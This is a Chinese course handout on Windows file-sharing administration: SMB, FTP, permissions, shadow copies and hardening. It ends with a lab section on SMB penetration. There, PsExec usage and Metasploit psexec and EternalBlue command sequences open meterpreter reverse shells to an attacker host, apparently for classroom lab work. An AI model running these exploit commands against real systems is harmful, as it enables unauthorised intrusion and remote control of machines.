# 03.项目三 Windows服务器共享管理

# 任务一 Windows文件共享基础搭建

---

## 知识点一：SMB文件共享协议

**📌 学什么**：了解Windows原生文件共享的底层协议机制，掌握SMB各版本的演进与差异。

**📖 什么是**：SMB（Server Message Block，服务器消息块）是微软主导制定的网络文件共享协议，运行于OSI模型应用层，默认绑定TCP **445端口**。它通过客户端-服务器模型，允许网络中的主机以 `\\服务器名\共享名` 的UNC路径格式访问远程文件、打印机等资源。SMB本质上是一种请求-响应协议，客户端发送SMB命令，服务端返回对应资源或操作结果。

**✅ 有什么用**：SMB是Windows网络环境中文件共享、打印共享、进程间通信（IPC$）的核心基础设施。所有通过”右键文件夹 → 共享”暴露出的网络资源，均通过SMB协议传输；域环境中的SYSVOL、NETLOGON等系统共享也依赖SMB。

**🎯 应用场景**：

- 企业内网中部门间的文件协作共享
- 域控制器向成员机分发组策略脚本（SYSVOL共享）
- 打印服务器的打印机共享
- 运维人员通过Admin$、C$等隐藏共享进行远程管理

SMB版本演进：

| 版本 | 操作系统 | 特点 |
| --- | --- | --- |
| SMBv1 | Windows XP/2003 | 已被废弃，存在严重安全漏洞（MS17-010） |
| SMBv2 | Windows Vista/2008 | 性能改进，减少协议往返次数 |
| SMBv2.1 | Windows 7/2008R2 | 支持大型MTU |
| SMBv3 | Windows 8/2012 | 支持端对端加密、持续可用性 |
| SMBv3.1.1 | Windows 10/2016 | 新增预身份验证完整性校验 |

### 🛠️ 实践：添加用户账号与建立共享文件夹

### 🖥️ 图形界面操作

**步骤一：创建用户与组**

1. 右键”此电脑” → **管理** → **本地用户和组** → **用户**
2. 右键空白区域 → **新用户**，依次创建 `Jerry`（密码 `P@ssw0rd123`）和 `Tom`
3. 切换到 **组** → 右键 → **新建组**，依次创建 `部门A`、`部门B`、`公司资源`
4. 双击 `部门A` → **添加** → 输入 `Jerry` → **检查名称** → **确定**；同理将 `Tom` 加入 `部门B`，将两人都加入 `公司资源`

**步骤二：创建并共享文件夹**

1. 在 `C:\` 下新建文件夹 `SharedFolder`，内部可按需创建子文件夹
2. 右键 `SharedFolder` → **属性** → **共享** → **高级共享** → 勾选 **共享此文件夹**，共享名填 `CompanyShare`
3. 点击 **权限**，删除默认 `Everyone`；添加 `部门A`（读取）、`部门B`（更改+读取）、`Administrators`（完全控制）
4. 在另一台电脑按 `Win + R` 输入 `\\服务器IP\CompanyShare` 验证访问

### ⌨️ 命令行操作

```jsx
# 创建用户与组
net user Jerry P@ssw0rd123 /add
net user Tom P@ssw0rd123 /add
net localgroup 部门A /add
net localgroup 部门B /add
net localgroup 公司资源 /add
net localgroup 部门A Jerry /add
net localgroup 部门B Tom /add
net localgroup 公司资源 Jerry /add
net localgroup 公司资源 Tom /add

# 创建共享
New-SmbShare -Name "CompanyShare" -Path "C:\SharedFolder" -FullAccess "Administrators" -ReadAccess "部门A" -ChangeAccess "部门B"

# 查看现有共享
Get-SmbShare
```

### 📝 本节小结

> SMB是Windows文件共享的底层协议，所有”右键共享”操作的本质都是配置SMB共享资源，通过TCP 445端口对外提供服务。创建共享前须先规划好用户与组的结构，共享权限的分配应以最小权限原则为基础。**应禁用SMBv1，优先使用SMBv3.x**，以获得加密和完整性保护。
> 

---

## 知识点二：文件传输协议（FTP）

**📌 学什么**：理解FTP的工作原理与两种传输模式，掌握IIS FTP服务的搭建与用户隔离配置。

**📖 什么是**：FTP（File Transfer Protocol，文件传输协议）是定义于RFC 959的应用层协议，使用**双通道机制**：控制通道（TCP 21端口）负责传递命令与响应，数据通道（主动模式使用TCP 20端口，被动模式使用随机高端口）负责文件数据传输。FTP传输内容（含账号密码）均为**明文**。

**✅ 有什么用**：FTP提供跨平台的文件上传、下载与目录管理能力。配合用户隔离功能，可为每个用户划定独立的文件访问边界，常用于Web托管、资源分发服务器等场景。

**🎯 应用场景**：

- 网站开发人员向Web服务器上传站点文件
- 企业为外部合作方提供文件交换接口
- 教学环境中演示协议行为与安全问题
- 生产环境推荐以 **FTPS（FTP over TLS）** 或 **SFTP（SSH文件传输协议）** 替代明文FTP

| 模式 | 数据连接发起方 | 特点 |
| --- | --- | --- |
| 主动模式（PORT） | 服务器 → 客户端随机端口 | 防火墙场景下易被拦截 |
| 被动模式（PASV） | 客户端 → 服务器随机高端口 | 穿越防火墙更友好，为现代客户端默认模式 |

**📐 主动模式 vs 被动模式——举例说明**

假设：FTP服务器IP `192.168.1.10`，客户端IP `192.168.1.20`，客户端本地随机端口 `5000`。

**主动模式（PORT）**

1. 客户端用端口 `5000` 连接服务器 **21端口**，建立控制通道
2. 客户端告诉服务器：“我的数据端口是 `5001`，你来连我”
3. 服务器从自己的 **20端口** 主动去连接 `192.168.1.20:5001`，建立数据通道

> ⚠️ 问题：客户端在防火墙/NAT后面时，服务器无法主动连入 → 传输失败
> 

**被动模式（PASV）**

1. 客户端用端口 `5000` 连接服务器 **21端口**，建立控制通道
2. 客户端请求传输数据，服务器随机开放高端口（如 `60000`），通知客户端
3. 客户端主动去连接 `192.168.1.10:60000`，建立数据通道

> ✅ 客户端始终是发起方，防火墙和NAT不会阻断 → 兼容现代网络环境
> 

```
主动模式：  客户端 ←←←← 服务器:20        （服务器主动连客户端）
被动模式：  客户端 →→→→ 服务器:随机高端口  （客户端主动连服务器）
```

> 💡 控制通道（21端口）两种模式完全相同，区别仅在**数据通道**的连接发起方。配置被动模式时，需在防火墙额外放行服务器的高端口范围（如 49152～65535），因为这些端口需要对外开放等待客户端连入。
> 

### 🛠️ 实践：搭建IIS FTP服务器

### 🖥️ 图形界面操作

**步骤一：安装IIS与FTP角色**

1. **服务器管理器** → **管理** → **添加角色和功能**
2. 在”服务器角色”页面展开 **Web服务器(IIS)** ，勾选 **FTP服务** 和 **FTP扩展性** → 完成安装

**步骤二：创建FTP站点**

1. 打开 **IIS管理器** → 右键 **网站** → **添加FTP站点**
2. 站点名称 `CompanyFTP`，物理路径 `C:\FTPRoot`（提前创建该文件夹）
3. 绑定：IP选服务器IP，端口 `21`，SSL选 **无SSL**（实验）或 **允许SSL**（生产）
4. 身份验证勾选 **基本**（取消匿名），允许访问指定用户 `Jerry`，按需勾选读取/写入权限

**步骤三：配置用户隔离**

1. 点击 `CompanyFTP` → 双击 **FTP用户隔离** → 选择 **用户名目录（禁用全局虚拟目录）** → **应用**
2. 在 `C:\FTPRoot` 下创建：`C:\FTPRoot\LocalUser\Jerry` 和 `C:\FTPRoot\LocalUser\Tom`

**步骤四：防火墙放行与验证**

1. **高级安全防火墙** → 新建入站规则 → 端口 TCP `21` → 允许连接
2. 客户端文件资源管理器地址栏输入 `ftp://服务器IP`，用 `Jerry` 凭据登录验证

### ⌨️ 命令行操作

```powershell
# 安装IIS和FTP角色
Install-WindowsFeature Web-FTP-Server, Web-FTP-Service, Web-FTP-Extensibility -IncludeManagementTools

# 创建目录结构
New-Item -ItemType Directory -Path "C:\FTPRoot\LocalUser\Jerry"
New-Item -ItemType Directory -Path "C:\FTPRoot\LocalUser\Tom"

# 创建FTP站点
Import-Module WebAdministration
New-WebFtpSite -Name "CompanyFTP" -Port 21 -PhysicalPath "C:\FTPRoot"

# 防火墙放行21端口
New-NetFirewallRule -DisplayName "Allow FTP" -Direction Inbound -Protocol TCP -LocalPort 21 -Action Allow
```

### 📝 本节小结

> FTP通过控制通道（21端口）和数据通道的双通道机制传输文件，但**账号密码及传输内容均为明文**，存在严重安全隐患。IIS可快速搭建FTP服务并通过用户隔离限制每个账户的访问范围。**生产环境应以SFTP（端口22）或FTPS替代明文FTP**。主动模式与被动模式的核心区别在于数据连接的发起方，防火墙环境下应优先使用被动模式。
> 

---

## 知识点三：共享权限与NTFS权限

**📌 学什么**：理解Windows访问控制的双层权限模型，掌握共享权限与NTFS权限叠加计算的核心规则。

**📖 什么是**：Windows对共享文件夹的访问控制由两套独立的ACL（访问控制列表）体系共同约束：

- **共享权限（Share Permission）** ：仅作用于网络访问路径，通过SMB协议访问时生效，粒度较粗，仅有读取、更改、完全控制三级。
- **NTFS权限（NTFS Permission）** ：作用于本地文件系统，无论本地访问还是网络访问均生效，粒度精细，支持读取、写入、修改、完全控制等多种权限，并支持继承与显式拒绝。

当用户通过网络访问共享时，系统计算两套权限的**交集**，取更严格的一方作为最终有效权限。

**✅ 有什么用**：双层权限模型将网络访问控制与本地文件系统安全隔离，使管理员既能快速开放网络访问入口，又能通过NTFS做精细的用户级、对象级权限管控，防止权限过度授予。

**🎯 应用场景**：

- 最佳实践：共享权限设为”完全控制”，用NTFS权限做精细管控，避免两处重复维护
- 多部门共享同一文件夹时，通过NTFS为不同安全组分配差异化的读写权限

| 用户 | 共享权限 | NTFS权限 | 最终有效权限 |
| --- | --- | --- | --- |
| Jerry（部门A） | 读取 | 修改 | 读取（取交集中更严格的） |
| Tom（部门B） | 更改 | 读取和执行 | 读取和执行 |

### 🛠️ 实践：文件夹共享权限与NTFS权限配置

### 🖥️ 图形界面操作

**共享权限设置**（控制网络访问层级）：

1. 右键共享文件夹 → **属性** → **共享** → **高级共享** → 点击 **权限**
2. 删除 `Everyone`，按需添加各用户/组并分配：
    - **读取**：可查看文件内容、运行程序
    - **更改**：读取 + 可添加/修改/删除文件
    - **完全控制**：更改 + 可修改权限设置

**NTFS权限设置**（控制本地和网络的精细访问）：

1. 右键文件夹 → **属性** → **安全** → **编辑** → **添加** → 输入用户/组名
2. 在权限列表中精细分配：完全控制 / 修改 / 读取和执行 / 列出文件夹内容 / 读取 / 写入
3. 若需更精细控制：点击 **高级** → **添加** → **选择主体** → 设置具体权限条目

### ⌨️ 命令行操作

```powershell
# 设置共享权限
Grant-SmbShareAccess -Name "CompanyShare" -AccountName "部门A" -AccessRight Read -Force

# 设置NTFS权限
$acl = Get-Acl "C:\SharedFolder"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("部门A","ReadAndExecute","ContainerInherit,ObjectInherit","None","Allow")
$acl.AddAccessRule($rule)
Set-Acl "C:\SharedFolder" $acl
```

### 📝 本节小结

> Windows采用**双层权限模型**：共享权限控制网络入口，NTFS权限控制文件系统对象。通过网络访问时，**最终有效权限 = min（共享权限, NTFS权限）** ，两者取更严格的交集。最佳实践是将共享权限设为”完全控制”，再由NTFS权限做精细管控，避免两套权限同时收紧导致维护困难。拒绝（Deny）权限优先于允许（Allow）权限，配置时需格外注意。
> 

---

## 知识点四：卷影副本与文件恢复

**📌 学什么**：了解卷影副本服务（VSS）的工作原理，掌握启用快照、配置计划与用户自助恢复文件的方法。

**📖 什么是**：卷影副本（Volume Shadow Copy）基于Windows卷影复制服务（VSS，Volume Shadow Copy Service），定期在磁盘卷上创建**只读时间点快照（Point-in-Time Snapshot）** 。快照记录创建时刻的文件系统状态，不随后续文件修改而变化。用户可通过文件/文件夹属性中的”以前的版本”选项卡浏览和还原历史版本，无需管理员介入。快照默认每天7:00和12:00自动创建，存储在同一卷的保留区域内（建议分配300MB～1GB）。

**✅ 有什么用**：卷影副本为共享文件夹提供轻量级的自动备份能力，显著降低因误删或误修改导致的数据丢失风险，同时减轻管理员的文件恢复工作负担，是共享存储场景下数据保护的重要补充手段。

**🎯 应用场景**：

- 用户误删或误改共享文件夹中的文件，自助恢复至历史版本
- 快速回滚被勒索软件加密前的文件状态（需快照未被破坏）
- 替代或补充完整备份方案，提供细粒度的版本历史

### 🛠️ 实践：启用与使用卷影副本

### 🖥️ 图形界面操作

**步骤一：启用卷影副本**

1. 打开 **计算机管理** → **存储** → **磁盘管理**，右键 `C:` → **属性** → **卷影副本** 选项卡
    
    （或：直接右键 `C:` 驱动器 → **配置卷影副本**）
    
2. 选中 `C:` → **启用** → 确认，系统立即创建第一个快照

**步骤二：配置存储空间与计划**

1. 选中 `C:` → **设置** → 修改最大占用空间（建议≥300MB）
2. 点击 **计划** → 可自定义快照频率和时间

**步骤三：用户自助恢复文件**

1. 右键目标文件/文件夹 → **属性** → **以前的版本** 选项卡
2. 选中目标快照版本 → 选择：**打开**（预览）/ **复制**（另存）/ **还原**（覆盖，谨慎操作）

### ⌨️ 命令行操作

```powershell
# 配置卷影副本存储空间
vssadmin add shadowstorage /for=C: /on=C: /maxsize=1GB

# 手动立即创建快照
wmic shadowcopy call create Volume="C:\\"

# 列出所有快照
vssadmin list shadows

# 删除指定快照
vssadmin delete shadows /shadow={快照ID} /quiet
```

> 💡 **教学建议**：可演示”创建文件 → 修改内容 → 从以前的版本还原”完整流程，直观展示卷影副本的价值。
> 

### 📝 本节小结

> 卷影副本通过VSS定期创建磁盘卷的只读快照，用户可通过”以前的版本”自助恢复误操作的文件，无需管理员介入。**启用前需预留足够存储空间（建议≥300MB）** ，快照数量与存储上限决定了可追溯的历史深度。注意：卷影副本不能替代完整备份，若整个磁盘故障则快照也会一并丢失，应与异地备份策略结合使用。
> 
> 
> ---
> 

# 任务二 Windows共享服务安全配置

---

## 知识点一：SMB版本识别与安全评估

**📌 学什么**：掌握通过PowerShell、注册表、事件日志等多种手段识别当前系统运行的SMB协议版本，为安全加固提供依据。

**📖 什么是**：SMB版本识别是对主机SMB服务配置状态进行安全评估的基础工作，包括服务端已启用的协议版本（服务器配置）、客户端支持的版本（客户端配置），以及当前活跃会话实际协商使用的协议版本（Dialect字段）。三者共同决定了系统的实际安全暴露面。

**✅ 有什么用**：识别SMB版本是安全加固的前提。若SMBv1仍处于启用状态，则系统暴露于MS17-010等高危漏洞的攻击面之下，评估结果直接指导后续加固方向。

**🎯 应用场景**：

- 服务器上线前的安全基线检查
- 渗透测试前的信息收集阶段
- 安全事件响应中的受影响版本排查

### 🛠️ 实践：查看当前SMB版本状态

### 🖥️ 图形界面操作

**方法一：PowerShell查看服务器端SMB配置**

```powershell
Get-SmbServerConfiguration | Select EnableSMB1Protocol, EnableSMB2Protocol
```

输出示例：

```powershell
EnableSMB1Protocol : False
EnableSMB2Protocol : True
```

> 💡 `EnableSMB2Protocol` 为 True 时，表示SMB 2.x和3.x均已启用（共用此开关）
> 

**方法二：查看当前活动会话协商的协议版本**

```powershell
Get-SmbSession | Select ClientComputerName, Dialect
```

- `1.0` = SMB 1.0　`2.1` = SMB 2.1　`3.1.1` = SMB 3.1.1

**方法三：事件日志查看**

1. 打开 **事件查看器** → **应用程序和服务日志** → **Microsoft** → **Windows** → **SMBServer** → **Security**
2. 查找事件ID **1009**（SMB会话建立），详细信息中显示协议版本

**方法四：主动创建测试会话**

1. 若当前无活动SMB会话，可通过以下方式建立测试连接：
    
    ```powershell
    # 从本机访问本机共享（需先创建共享文件夹）
    net use \\localhost\共享名 /user:用户名 密码
    
    # 或访问其他网络主机
    net use \\目标IP\C$ /user:administrator 密码
    ```
    
2. 建立连接后再次执行 `Get-SmbSession` 即可查看协商的协议版本
3. 验证完毕后断开连接：
    
    ```powershell
    net use * /delete /y
    ```
    

### ⌨️ 命令行操作

```powershell
# 查看SMB客户端配置
Get-SmbClientConfiguration | Select EnableSMB1Protocol, EnableSMB2Protocol

# 查看已建立连接使用的版本
Get-SmbConnection | Select ServerName, Dialect

# 注册表方式检查SMB1/2是否启用
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" | Select SMB1, SMB2
```

### 📝 本节小结

> SMB版本识别应从三个维度入手：**服务器配置**（是否启用各版本）、**客户端配置**（支持哪些版本）、**活跃会话**（实际协商使用哪个版本）。若发现 `EnableSMB1Protocol: True`，应立即执行禁用操作。PowerShell是最快捷的查看方式，事件日志则提供实时连接的版本记录，适合审计场景。
> 

---

## 知识点（补充）：端口转发实验

**📌 学什么**：掌握Windows环境下端口转发的原理与配置方法，理解端口转发在网络服务发布与安全测试中的作用。

**📖 什么是**：端口转发（Port Forwarding）是一种网络地址转换（NAT）技术，将到达本机某端口的流量重定向到另一个IP地址和端口。Windows自带的 `netsh interface portproxy` 命令可在无需第三方工具的情况下实现端口转发功能。常见场景包括：将外部端口映射到内网服务、绕过防火墙限制访问内部服务、在渗透测试中建立流量隧道等。

**✅ 有什么用**：端口转发是网络运维和安全测试中的基础技能。运维侧可用于将公网端口映射到内网服务器，实现服务对外发布；安全侧在渗透测试中常用于内网穿透、流量转发和隧道搭建。

**🎯 应用场景**：

- 将外部访问的非标准端口转发到内网服务器的标准服务端口（如将8080转发到内网80）
- 在实验环境中模拟NAT端口映射，理解防火墙端口发布原理
- 渗透测试中利用已控主机建立端口转发隧道，访问内网其他主机的服务

### 🛠️ 实践：使用netsh配置端口转发

### 场景说明

在**同一台主机**上完成端口转发实验：

- **本机IP**：`127.0.0.1`（[localhost](http://localhost/)）
- **本机已运行的服务**：FTP服务（21端口）或SMB服务（445端口）

目标：在本机配置端口转发，将本机的 `9999端口` 转发到本机的 `21端口`（FTP），使通过访问 `127.0.0.1:9999` 即可到达本机的FTP服务（21端口）。

```powershell
访问 127.0.0.1:9999  →  portproxy转发  →  127.0.0.1:21（FTP服务）
```

> 💡 **前提条件**：本机需已搭建好FTP服务（参考知识点二的IIS FTP搭建步骤），确保21端口正在监听。可用 `netstat -an | findstr :21` 确认。
> 

### ⌨️ 命令行操作

```powershell
# 步骤一：确认本机FTP服务已启动（21端口在监听）
netstat -an | findstr :21

# 步骤二：添加端口转发规则
# 将本机9999端口的流量转发到本机的21端口（FTP服务）
netsh interface portproxy add v4tov4 listenport=9999 listenaddress=127.0.0.1 connectport=21 connectaddress=127.0.0.1

# 步骤三：查看当前所有端口转发规则
netsh interface portproxy show all

# 步骤四：验证转发是否生效
# 方法一：测试端口连通性
Test-NetConnection -ComputerName 127.0.0.1 -Port 9999

# 方法二：用浏览器或资源管理器访问 ftp://127.0.0.1:9999 登录FTP
# 方法三：命令行FTP客户端测试
ftp 127.0.0.1 9999

# 步骤五：删除端口转发规则（实验结束后清理）
netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=127.0.0.1
```

### 🖥️ 参数说明

| 参数 | 说明 |
| --- | --- |
| listenport | 本机监听的端口号（转发入口端口，此处为9999） |
| listenaddress | 本机监听的IP地址，127.0.0.1表示仅本机可访问 |
| connectport | 转发目标的端口号（实际服务端口，此处为21） |
| connectaddress | 转发目标的IP地址（此处为127.0.0.1，即本机） |

### 💡 拓展：本机其他端口转发变体

```powershell
# SMB端口转发：将本机9445端口转发到本机的445端口
# （注意：445端口可能被系统占用，需确认SMB服务已启动）
netsh interface portproxy add v4tov4 listenport=9445 listenaddress=127.0.0.1 connectport=445 connectaddress=127.0.0.1

# RDP端口转发：将本机33389端口转发到本机的3389端口
netsh interface portproxy add v4tov4 listenport=33389 listenaddress=127.0.0.1 connectport=3389 connectaddress=127.0.0.1

# 验证后统一清理
netsh interface portproxy reset
```

### 📝 本节小结

> `netsh interface portproxy` 是Windows原生的端口转发工具，无需安装第三方软件即可实现TCP端口的重定向。配置端口转发时需**同步放行防火墙规则**，否则外部流量无法到达监听端口。端口转发在运维中用于服务发布，在安全测试中用于内网穿透和隧道搭建。注意：`portproxy` 仅支持**TCP协议**，不支持UDP转发；且需要 **IP Helper服务（iphlpsvc）** 处于运行状态才能生效。
> 

---

## 知识点二：匿名访问控制与枚举防护

**📌 学什么**：理解Windows匿名枚举机制的安全风险，掌握通过组策略限制匿名访问的配置方法。

**📖 什么是**：Windows系统默认允许未认证的匿名用户通过空会话（Null Session）连接到IPC$共享，进而枚举本机的用户账号列表（SAM）和共享资源列表。这一设计源于早期网络兼容性需求，但为攻击者提供了无需凭据即可收集目标信息的途径。控制匿名枚举的核心注册表路径为 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`，关键键值为 `RestrictAnonymous` 和 `RestrictAnonymousSAM`。

**✅ 有什么用**：禁用匿名枚举后，攻击者无法在未获得有效凭据的前提下通过空会话获取用户名列表和共享信息，切断信息收集阶段的重要渠道，提升暴力破解的攻击成本。

**🎯 应用场景**：

- Windows服务器安全基线加固（CIS Benchmark要求）
- 防范内网横向移动中的信息侦察行为
- 等级保护合规中对访问控制的要求项

### 🛠️ 实践：关闭SAM账号和共享的匿名枚举

### 🖥️ 图形界面操作

1. 按 `Win + R` 输入 `gpedit.msc` → **计算机配置** → **Windows设置** → **安全设置** → **本地策略** → **安全选项**
2. 找到并双击以下两项，均设置为 **已启用**：
    - **网络访问：不允许SAM账号的匿名枚举**
    - **网络访问：不允许SAM账号和共享的匿名枚举**
3. 按 `Win + R` 输入 `gpupdate /force` 立即生效

### ⌨️ 命令行操作

```jsx
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymousSAM /t REG_DWORD /d 1 /f
```

### 📝 本节小结

> 匿名枚举是攻击者在内网侦察阶段常用的信息收集手段，利用Windows空会话机制无需凭据即可获取用户列表和共享列表。**两个策略项（RestrictAnonymous + RestrictAnonymousSAM）须同时启用才能完整防护**，缺一则仍存在信息泄露风险。配置后通过 `gpupdate /force` 强制刷新并验证策略是否生效。
> 

---

## 知识点三：网络凭据存储安全

**📌 学什么**：理解Windows凭据管理器的工作机制，掌握禁止系统缓存网络身份验证凭据的配置方法。

**📖 什么是**：Windows凭据管理器（Credential Manager）可将用户访问网络资源时输入的账号密码以加密形式缓存于本地，下次访问相同资源时自动提交，无需再次输入。虽然提升了使用便捷性，但本地缓存的凭据在主机失陷后可被攻击者通过Mimikatz等工具提取，成为横向移动的凭据来源。组策略项”网络访问：不允许存储网络身份验证的密码和凭据”可禁用此缓存行为。

**✅ 有什么用**：禁用凭据缓存后，即使攻击者在获取主机控制权后尝试提取本地凭据，也无法获取用于访问其他网络资源的有效凭据，有效阻断横向移动路径。

**🎯 应用场景**：

- 高安全等级服务器的加固配置
- 防御Pass-the-Hash、凭据窃取类攻击
- 金融、政务等对数据安全有严格要求的环境

### 🛠️ 实践：禁止存储网络身份验证凭据

### 🖥️ 图形界面操作

1. 按 `Win + R` 输入 `gpedit.msc` → **计算机配置** → **Windows设置** → **安全设置** → **本地策略** → **安全选项**
2. 找到 **网络访问：不允许存储网络身份验证的密码和凭据** → 设置为 **已启用** → **确定**
3. `gpupdate /force` 刷新策略
4. **补充：清除已有缓存**：**控制面板** → **用户帐户** → **凭据管理器** → 逐条展开并 **删除** 已保存的Windows凭据

### ⌨️ 命令行操作

```jsx
# 注册表方式
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableDomainCreds /t REG_DWORD /d 1 /f

# 查看已缓存的凭据
cmdkey /list

# 删除指定凭据
cmdkey /delete:targetname
```

### 📝 本节小结

> 凭据管理器的本地缓存是内网横向移动的重要凭据来源。启用此策略后，系统不再保存用于网络认证的凭据，使攻击者即使控制主机也难以获取有效的横向移动凭据。**配置时需同时清除已有缓存**（通过凭据管理器或 `cmdkey /delete`），否则历史凭据仍存在泄露风险。注意：此配置可能影响使用保存凭据的自动化脚本，部署前需评估影响范围。
> 

---

---

# 任务三 Windows共享服务渗透（拓展）

---

## 知识点一：SMB服务攻击面概述

**📌 学什么**：理解SMB协议作为攻击目标的暴露面，建立对SMB相关漏洞利用路径的整体认知框架。

**📖 什么是**：SMB服务作为Windows网络基础设施的核心组件，长期以来是攻击者重点关注的攻击面。其主要风险来源包括：①协议实现层面的内存安全漏洞（如整数溢出、堆溢出）；②认证机制的弱口令与凭据复用问题；③管理员隐藏共享（Admin$、C$）被滥用于横向移动。SMB默认运行于TCP **445端口**，在未做边界防护的网络中可被直接访问。

**✅ 有什么用**：理解攻击路径是构建有效防御体系的前提。从攻防两个视角分析SMB漏洞，有助于准确评估资产风险、制定有针对性的缓解措施。

**🎯 应用场景**：

- 渗透测试中对内网Windows主机的漏洞评估
- 安全运营中对SMB相关威胁情报的研判
- 防御侧的补丁优先级决策依据

### 🛠️ 实践：PsExec共享连接远程命令执行

PsExec是Sysinternals工具套件中的命令行工具，通过SMB/Admin$共享在远程计算机上执行命令。

### 🖥️ 图形界面操作

**步骤一：下载PsExec**

- 访问微软官方Sysinternals网站，下载 **PsTools** 工具包，解压到 `C:\Tools\PsTools`

**步骤二：远程执行命令**

- 以管理员身份打开命令提示符，切换到PsExec目录：

```bash
# 打开远程主机交互式命令行
PsExec.exe \\192.168.100.20 -u administrator -p P@ssw0rd cmd

# 执行单条命令
PsExec.exe \\192.168.100.20 -u administrator -p P@ssw0rd ipconfig /all

# 以SYSTEM权限运行
PsExec.exe \\192.168.100.20 -u administrator -p P@ssw0rd -s cmd
```

**步骤三：Armitage图形界面（可选）**

1. Kali终端输入 `armitage` 启动
2. Hosts → Add Hosts → 输入靶机IP → 右键 Scan
3. Attacks → Find Attacks → 右键靶机 → Attack → smb → psexec → 填写凭据 → Launch
4. 成功后目标图标变红（带闪电），表示已获取shell

### ⌨️ 命令行操作（Metasploit）

```jsx
use exploit/windows/smb/psexec
set RHOSTS 192.168.100.20
set SMBUser administrator
set SMBPass P@ssw0rd
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.10
exploit
```

### 📝 本节小结

> SMB的攻击面涵盖**协议漏洞、弱口令、管理员共享滥用**三类。PsExec演示了拥有管理员凭据后通过Admin$共享实现远程命令执行的典型路径——这也是为什么禁用匿名枚举、强制复杂密码、限制Admin$访问如此重要。**防御侧应封堵内网445端口的非必要访问**，并对Admin$等隐藏共享的访问行为开启审计。
> 

---

## 知识点二：MS17-010（永恒之蓝）

**📌 学什么**：深入理解MS17-010漏洞的技术原理、影响范围与修复措施，掌握其在实验环境中的复现方法。

**📖 什么是**：MS17-010是2017年由Shadow Brokers泄露的NSA网络武器中包含的一组SMBv1协议漏洞（CVE-2017-0144/0145/0146/0147/0148）。其技术本质为：SMBv1的事务请求处理函数（Trans2 FIND_FIRST2等）存在整数溢出漏洞，攻击者通过发送特制的SMB数据包可触发堆溢出，从而在目标系统**内核态**执行任意代码。该漏洞**无需用户交互，无需有效凭据**，具备蠕虫式自传播能力。

**✅ 有什么用**：理解该漏洞揭示了协议实现层内存安全漏洞的危害上限——无需凭据即可获取SYSTEM级权限。WannaCry、NotPetya等勒索软件均以此漏洞为传播引擎，造成全球数十亿美元损失，是研究”协议层RCE”的标志性案例。

**🎯 应用场景**：实验环境中使用Metasploit的 `ms17_010_eternalblue` 模块对未打补丁靶机进行漏洞复现；防御侧：立即安装KB4012212等补丁，并**禁用SMBv1**作为根本性缓解措施。

| 属性 | 内容 |
| --- | --- |
| CVE编号 | CVE-2017-0144/0145/0146/0147/0148 |
| 影响版本 | Windows XP ~ Windows Server 2008 R2（SMBv1） |
| 危害 | 远程代码执行，无需身份验证 |
| 事件 | WannaCry、NotPetya勒索病毒利用此漏洞大规模传播 |
| 修复 | 安装MS17-010补丁（KB4012212等），禁用SMBv1 |

**漏洞原理**：SMBv1事务请求处理函数存在整数溢出，特制SMB请求可触发堆溢出，进而在内核态执行任意代码，无需任何身份验证。

### 🛠️ 实践：MS17-010漏洞复现

### 🖥️ 图形界面操作

**靶机侧准备**：

1. **确认SMBv1已启用**：控制面板 → 程序 → 启用或关闭Windows功能 → 确认 **SMB 1.0/CIFS文件共享支持** 已勾选
2. **关闭防火墙**（实验环境）：控制面板 → Windows Defender防火墙 → 将所有网络类型设为关闭
3. **确认未安装MS17-010补丁**：控制面板 → 查看已安装的更新 → 确认无 `KB4012212`

**Kali侧使用Armitage**：

1. `armitage` 启动 → 添加靶机IP → 右键 Scan
2. Attacks → Find Attacks → 右键靶机 → Attack → smb → ms17_010_eternalblue → 设置payload → Launch
3. 成功后右键红色主机 → Meterpreter → 进行后续操作

### ⌨️ 命令行操作

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.100.20
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.10
exploit

# 成功后
meterpreter > getuid    # 查看权限（应为SYSTEM）
meterpreter > sysinfo   # 查看系统信息
```

### 📝 本节小结

> MS17-010是SMBv1内存漏洞的集大成者，**无需认证即可在内核态执行任意代码并获取SYSTEM权限**，危害等级极高。根本修复方案为：①安装KB4012212等对应补丁；②**彻底禁用SMBv1**。该漏洞清晰说明了为何淘汰旧版本协议如此紧迫——旧协议的安全设计缺陷无法通过配置规避，只有彻底关闭才能消除风险。
> 

---

## 知识点三：CVE-2020-0796（SMBGhost）

**📌 学什么**：理解SMBGhost漏洞在SMBv3协议压缩功能中的成因，了解其与MS17-010的技术差异，掌握检测与防御方法。

**📖 什么是**：CVE-2020-0796（SMBGhost）是2020年3月披露的SMBv3.1.1协议漏洞。SMBv3.1.1引入了数据压缩功能，在处理客户端发送的压缩数据时，内核驱动 `srv2.sys` 对压缩数据头中的 `OriginalCompressedSegmentSize` 字段未做充分校验，导致整数溢出，进而引发**内核池缓冲区溢出**，攻击者可实现内核权限下的任意代码执行。该漏洞同样无需身份验证，具备蠕虫式传播潜力。

**✅ 有什么用**：SMBGhost证明即使在较新的SMBv3协议中，新引入的特性（压缩）同样可能携带内存安全问题，说明**协议版本升级并不等同于安全风险消除**，持续的补丁管理仍是必要的。

**🎯 应用场景**：

- 实验环境中使用Nmap脚本或PoC脚本验证目标是否存在漏洞
- 防御侧：立即安装KB4551762；临时缓解：`Set-SmbServerConfiguration -DisableCompression $true`

| 属性 | 内容 |
| --- | --- |
| CVE编号 | CVE-2020-0796 |
| 影响版本 | Windows 10 1903/1909，Windows Server 1903/1909 |
| 协议版本 | SMBv3.1.1（压缩功能） |
| 危害 | 远程代码执行（蠕虫级，无需认证） |
| 修复 | KB4551762；临时缓解：禁用SMB压缩 |

> 🆕 **近年SMB相关漏洞补充**：
> 

> • **CVE-2023-23376**（Windows Common Log File System提权）：与SMB结合可实现完整攻击链
> 

> • **防御最佳实践**：网络边界阻断入站SMB流量（445/139端口），内网强制SMB签名与加密，定期补丁管理
> 

### 🛠️ 实践：CVE-2020-0796漏洞复现

### 🖥️ 图形界面操作

**靶机侧准备**：

